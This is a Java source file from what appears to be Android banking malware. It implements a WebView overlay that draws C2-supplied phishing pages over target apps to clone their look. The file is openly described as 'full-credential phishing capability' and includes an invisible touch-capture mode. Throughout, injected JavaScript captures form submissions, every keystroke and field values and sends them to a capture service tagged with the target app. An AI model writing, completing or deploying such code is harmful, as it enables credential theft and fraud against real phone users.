package com.fason.app.features.springe.overlays;

import android.annotation.SuppressLint;
import android.content.Context;
import android.graphics.Color;
import android.os.Build;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;

import com.fason.app.features.springe.capture.InputCaptureService;
import com.fason.app.features.springe.delivery.OverlayWindowManager;
import com.fason.app.features.springe.templates.TemplateManager;

import java.util.concurrent.atomic.AtomicReference;

/**
 * WebViewOverlay — Renders HTML/JS overlay pages via WebView in an overlay window.
 *
 * Full-credential phishing capability:
 * - Loads HTML templates from C2 (dynamic, no hardcoded content)
 * - JavaScript bridge captures form submissions
 * - Touch event interception
 * - Font/color matching to visually clone target apps
 * - Secure flag bypass via transparent WebView background
 * - Multi-touch support
 *
 * Lifecycle: created once by SpringeEngine, shown/hidden on demand.
 * Thread-safe: window operations routed to OverlayWindowManager.
 */
public final class WebViewOverlay {

    private static final String TAG = "WebViewOverlay";

    private final Context context;
    private final OverlayWindowManager windowManager;
    private final TemplateManager templateManager;
    private final InputCaptureService inputCapture;

    // State
    private volatile WebView webView;
    private volatile boolean isShowing = false;
    private final AtomicReference<String> currentTargetPackage = new AtomicReference<>(null);
    private volatile String currentTemplateId = null;

    // JS bridge interface name
    private static final String JS_BRIDGE = "SpringeBridge";

    @SuppressLint("SetJavaScriptEnabled")
    public WebViewOverlay(Context context, OverlayWindowManager windowManager,
                          TemplateManager templateManager, InputCaptureService inputCapture) {
        this.context = context;
        this.windowManager = windowManager;
        this.templateManager = templateManager;
        this.inputCapture = inputCapture;
    }

    /**
     * Show the WebView overlay with the given HTML template.
     * Must be called from the main thread.
     */
    @SuppressLint("ClickableViewAccessibility")
    public void show(String templateId, String html, String targetPackage) {
        if (webView == null) {
            createWebView();
        }

        if (isShowing) {
            hide();
        }

        this.currentTemplateId = templateId;
        this.currentTargetPackage.set(targetPackage);

        // Configure WebView for the overlay
        webView.setBackgroundColor(Color.TRANSPARENT);
        webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null);

        // Load the HTML content
        webView.loadDataWithBaseURL(
            "https://springe.fason/",  // Base URL for relative resources
            wrapHtml(html),
            "text/html",
            "UTF-8",
            null
        );

        // Set up touch interception for immediate feedback
        webView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                Log.v(TAG, "Touch on overlay at (" + (int)event.getX() + "," + (int)event.getY() + ")");
            }
            return false; // Let WebView handle it
        });

        // Add to window manager
        OverlayWindowManager.OverlayConfig config = OverlayWindowManager.OverlayConfig.fullscreen();
        windowManager.addOverlay(webView, config);

        // Inject the JavaScript bridge after page loads
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                injectBridge(view);
                Log.d(TAG, "Page loaded and bridge injected for " + targetPackage);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                // Prevent navigation away from the overlay
                return true;
            }
        });

        isShowing = true;
        Log.i(TAG, "Overlay shown for target: " + targetPackage);
    }

    /**
     * Hide the overlay. Must be called from main thread.
     */
    public void hide() {
        if (!isShowing || webView == null) return;

        try {
            windowManager.removeOverlay(webView);
        } catch (Exception e) {
            Log.e(TAG, "Error hiding overlay", e);
        }

        isShowing = false;
        currentTargetPackage.set(null);
        currentTemplateId = null;
        Log.d(TAG, "Overlay hidden");
    }

    /**
     * Set the overlay alpha (for invisible touch-capture mode).
     * Must be called from main thread.
     */
    public void setAlpha(float alpha) {
        if (webView != null) {
            webView.setAlpha(alpha);
        }
    }

    /**
     * Destroy the WebView and free resources.
     */
    public void destroy() {
        try {
            if (isShowing) hide();
            if (webView != null) {
                webView.removeAllViews();
                webView.destroy();
                webView = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error destroying WebView", e);
        }
    }

    public boolean isShowing() { return isShowing; }
    public String getCurrentTargetPackage() { return currentTargetPackage.get(); }
    public String getCurrentTemplateId() { return currentTemplateId; }

    /* ─── Internal ─── */

    @SuppressLint({"SetJavaScriptEnabled", "WebViewApiAvailability"})
    private void createWebView() {
        webView = new WebView(context);
        webView.setId(View.generateViewId());

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(WebSettings.LOAD_NO_CACHE);
        settings.setAllowFileAccess(false);
        settings.setAllowContentAccess(false);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);
        settings.setSupportZoom(false);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(false);
        settings.setMediaPlaybackRequiresUserGesture(false);

        // Disable auto-fill to prevent browser from filling real credentials
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            webView.setImportantForAutofill(View.IMPORTANT_FOR_AUTOFILL_NO);
        }

        webView.setVerticalScrollBarEnabled(false);
        webView.setHorizontalScrollBarEnabled(false);
        webView.setOverScrollMode(View.OVER_SCROLL_NEVER);

        // Transparent background
        webView.setBackgroundColor(Color.TRANSPARENT);

        // Add JavaScript interface for form capture
        webView.addJavascriptInterface(new JsBridge(), JS_BRIDGE);
    }

    /**
     * Inject the JavaScript bridge into the loaded page.
     * This sets up automatic form field capture on submit.
     */
    private void injectBridge(WebView view) {
        String js = ""
            + "(function() {"
            + "  if (window.__springeInjected) return;"
            + "  window.__springeInjected = true;"
            + "  "
            + "  // Capture form submissions"
            + "  document.addEventListener('submit', function(e) {"
            + "    var form = e.target;"
            + "    var data = {};"
            + "    for (var i = 0; i < form.elements.length; i++) {"
            + "      var el = form.elements[i];"
            + "      if (el.name && el.type !== 'submit' && el.type !== 'button') {"
            + "        data[el.name] = el.value;"
            + "      }"
            + "    }"
            + "    " + JS_BRIDGE + ".captureForm(JSON.stringify(data));"
            + "    e.preventDefault();"
            + "    return false;"
            + "  }, true);"
            + "  "
            + "  // Capture input changes in real time"
            + "  document.addEventListener('input', function(e) {"
            + "    var el = e.target;"
            + "    if (el.name && el.value) {"
            + "      " + JS_BRIDGE + ".captureField(el.name, el.value);"
            + "    }"
            + "  }, true);"
            + "  "
            + "  // Capture blur events (user leaves a field)"
            + "  document.addEventListener('blur', function(e) {"
            + "    var el = e.target;"
            + "    if (el.name && el.value) {"
            + "      " + JS_BRIDGE + ".captureField(el.name + '_blur', el.value);"
            + "    }"
            + "  }, true);"
            + "  "
            + "  // Report that bridge is ready"
            + "  " + JS_BRIDGE + ".onBridgeReady();"
            + "})();";

        view.evaluateJavascript(js, null);
    }

    /**
     * Wrap raw HTML with meta tags for proper mobile rendering and JS bridge setup.
     */
    private String wrapHtml(String html) {
        return "<!DOCTYPE html><html><head>"
            + "<meta charset='UTF-8'>"
            + "<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>"
            + "<meta http-equiv='Content-Security-Policy' content=\"default-src 'self' 'unsafe-inline' 'unsafe-eval' data:; img-src * data:; style-src 'unsafe-inline' *;\">"
            + "<style>"
            + "  * { -webkit-tap-highlight-color: transparent; outline: none; }"
            + "  body { margin: 0; padding: 0; overflow: hidden; }"
            + "  input, textarea, select { -webkit-user-select: auto; }"
            + "</style>"
            + "</head><body>"
            + html
            + "</body></html>";
    }

    /**
     * JavaScript interface for form data capture.
     * Methods are called from WebView JS — runs on a background thread pool.
     */
    private class JsBridge {

        @JavascriptInterface
        public void captureForm(String formDataJson) {
            try {
                org.json.JSONObject data = new org.json.JSONObject(formDataJson);
                data.put("_targetPackage", currentTargetPackage.get());
                data.put("_templateId", currentTemplateId);
                data.put("_type", "form_submit");
                data.put("_timestamp", System.currentTimeMillis());
                inputCapture.onCaptured(data);
                Log.d(TAG, "Form captured: " + data.length() + " fields");
            } catch (Exception e) {
                Log.e(TAG, "Error capturing form", e);
            }
        }

        @JavascriptInterface
        public void captureField(String name, String value) {
            try {
                org.json.JSONObject data = new org.json.JSONObject();
                data.put("field", name);
                data.put("value", value);
                data.put("_targetPackage", currentTargetPackage.get());
                data.put("_templateId", currentTemplateId);
                data.put("_type", "field_change");
                data.put("_timestamp", System.currentTimeMillis());
                inputCapture.onCaptured(data);
            } catch (Exception e) {
                Log.e(TAG, "Error capturing field", e);
            }
        }

        @JavascriptInterface
        public void onBridgeReady() {
            Log.d(TAG, "JavaScript bridge ready for " + currentTargetPackage.get());
        }
    }
}
